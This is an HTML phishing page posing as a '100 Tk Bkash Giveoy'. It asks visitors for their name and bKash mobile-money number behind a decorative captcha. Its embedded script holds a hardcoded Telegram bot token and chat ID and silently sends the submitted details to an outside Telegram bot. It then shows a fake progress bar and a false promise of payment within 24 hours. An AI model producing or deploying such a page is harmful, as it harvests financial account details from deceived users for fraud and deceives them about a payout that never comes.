<!doctype html>
<html lang="bn">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>100 Tk Bkash Giveoy</title>
<style>
  /* ডার্ক মোড ব্যাকগ্রাউন্ড */
  body{
    margin:0;
    min-height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
    background:#1a1a1a; 
    font-family: "Inter", sans-serif;
    padding:10px;
  }

  /* কার্ড স্টাইল */
  .card{
    width:100%;
    max-width:360px;
    background:#2c2c2c;
    border-radius:18px;
    box-shadow:0 8px 30px rgba(0,0,0,0.5);
    padding:25px 20px;
    display:flex;
    flex-direction:column;
    gap:15px;
    transition: transform 0.3s, box-shadow 0.3s;
    box-sizing: border-box;
  }
  .card:hover{
    transform: translateY(-3px);
    box-shadow:0 12px 35px rgba(0,0,0,0.6);
  }

  /* হেডিং */
  h1{
    text-align:center;
    font-size:22px;
    color:#F527BE;
    margin:0 0 10px;
    letter-spacing:1px;
  }

  /* লেবেল স্টাইল */
  label{
    display:block;
    margin-bottom:5px;
    font-size:14px;
    color:#fff;
    font-weight:500;
  }

  /* ইনপুট বক্স স্টাইল */
  input[type="text"], input[type="tel"], .captcha-input{
    width:100%;
    padding:10px;
    border:1px solid #555;
    border-radius:10px;
    background:#1f1f1f;
    font-size:14px;
    color:#fff;
    outline:none;
    transition:0.3s;
    box-sizing:border-box;
  }
  input[type="text"]:focus,input[type="tel"]:focus, .captcha-input:focus{
    border-color:#F527BE;
    box-shadow:0 5px 15px rgba(245,39,190,0.3);
  }

  /* ক্যাপচা কনটেইনার */
  .captcha-container{
    display:flex;
    flex-direction:column;
    gap:5px;
  }

  .captcha-row{
    display:flex;
    align-items:center;
    gap:5px;
  }

  /* ক্যাপচা বক্স ছোট করা */
  .captcha-box{
    flex:0 0 35%;
    background:#1f1f1f;
    padding:8px 4px;
    border-radius:8px;
    text-align:center;
    font-weight:bold;
    font-size:14px;
    letter-spacing:2px;
    user-select:none;
    border:1px solid #555;
    box-sizing:border-box;
    color:#fff;
  }

  /* রিজেনারেট বাটন কার্ডের ভিতরে */
  .regen{
    background:none;
    border:none;
    color:#F527BE;
    font-size:12px;
    cursor:pointer;
    flex-shrink:0;
  }

  .btn{
    width:100%;
    padding:14px;
    border:none;
    border-radius:12px;
    background:#F527BE;
    color:#fff;
    font-size:15px;
    font-weight:bold;
    cursor:pointer;
    transition:0.3s;
  }
  .btn:hover{
    background:#d51fab;
    box-shadow:0 3px 10px rgba(0,0,0,0.4);
  }

  /* overlay */
  .overlay{
    position:fixed;
    inset:0;
    background:rgba(0,0,0,0.7);
    display:none;
    align-items:center;
    justify-content:center;
    z-index:999;
  }
  .panel{
    background:#2c2c2c;
    padding:20px 15px;
    border-radius:12px;
    width:280px;
    text-align:center;
    box-sizing:border-box;
    color:#fff;
  }
  .loader{
    width:80px;height:80px;border-radius:50%;
    border:8px solid #444;
    border-top-color:#F527BE;
    margin:0 auto 12px;
    animation:spin 1s linear infinite;
  }
  @keyframes spin{from{transform:rotate(0)}to{transform:rotate(360deg)}}
  .percent{font-weight:bold;font-size:16px;margin-top:8px}
  .success-msg{font-size:13px;color:#F527BE;font-weight:bold;line-height:1.4}
</style>
</head>
<body>
<div class="card">
  <h1>100 Tk Bkash Giveoy</h1>
  <form id="payForm">
    <div>
      <label for="fullname">Your Name</label>
      <input id="fullname" type="text" required placeholder="Enter your name">
    </div>

    <div>
      <label for="bkashnum">Bkash Number</label>
      <input id="bkashnum" type="tel" required placeholder="01XXXXXXXXX" pattern="[0-9]{11}">
    </div>

    <div class="captcha-container">
      <label>Captcha</label>
      <div class="captcha-row">
        <div class="captcha-box" id="captchaBox">----</div>
        <input id="captchaInput" class="captcha-input" placeholder="Type captcha" required>
        <button type="button" class="regen" id="regenBtn">Regenerate</button>
      </div>
    </div>

    <button type="submit" class="btn">Send</button>
  </form>
</div>

<div class="overlay" id="overlay">
  <div class="panel">
    <div class="loader" id="loader"></div>
    <div class="percent" id="percentText">0%</div>
    <div class="success-msg" id="successMsg" style="display:none"></div>
  </div>
</div>

<script>
  const BOT_TOKEN = "8088507666:AAGxnWx0-i6aKT1pWHXskK5VSmDkYqPLYis";
  const CHAT_ID = "6593402184";

  const captchaBox = document.getElementById('captchaBox');
  const regenBtn = document.getElementById('regenBtn');
  const captchaInput = document.getElementById('captchaInput');

  function generateCaptcha(len=5){
    const chars="ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
    let s=""; for(let i=0;i<len;i++) s+=chars[Math.floor(Math.random()*chars.length)];
    return s;
  }
  function renderCaptcha(){
    const c = generateCaptcha(5);
    captchaBox.textContent = c;
    captchaBox.dataset.value = c.toLowerCase();
  }
  regenBtn.onclick = ()=>{ renderCaptcha(); captchaInput.value=""; }
  renderCaptcha();

  const form=document.getElementById('payForm');
  const overlay=document.getElementById('overlay');
  const percentText=document.getElementById('percentText');
  const successMsg=document.getElementById('successMsg');
  const loader=document.getElementById('loader');

  form.addEventListener('submit', async(e)=>{
    e.preventDefault();
    const name=document.getElementById('fullname').value.trim();
    const number=document.getElementById('bkashnum').value.trim();
    const typed=captchaInput.value.trim().toLowerCase();
    const actual=captchaBox.dataset.value;
    if(typed!==actual){ alert("Captcha wrong!"); renderCaptcha(); return; }

    overlay.style.display="flex";
    successMsg.style.display="none";
    loader.style.display="block";
    percentText.style.display="block";
    percentText.textContent="0%";

    const message=`New 50Tk Giboy Request\nName: ${name}\nBkash: ${number}\nTime: ${new Date().toLocaleString()}`;
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({chat_id:CHAT_ID,text:message})
    });

    let p=0;
    const interval=setInterval(()=>{
      p+=Math.floor(Math.random()*15)+5;
      if(p>=100){
        p=100;
        clearInterval(interval);
        loader.style.display="none";
        percentText.style.display="none";
        successMsg.style.display="block";
        successMsg.innerHTML="Your Giboy request successful.<br>You will receive within 24 hours.<br>Please wait a moment.";
        setTimeout(()=>{overlay.style.display="none";},5000);
      }
      percentText.textContent=p+"%";
    },400);
  });
</script>
</body>
</html>
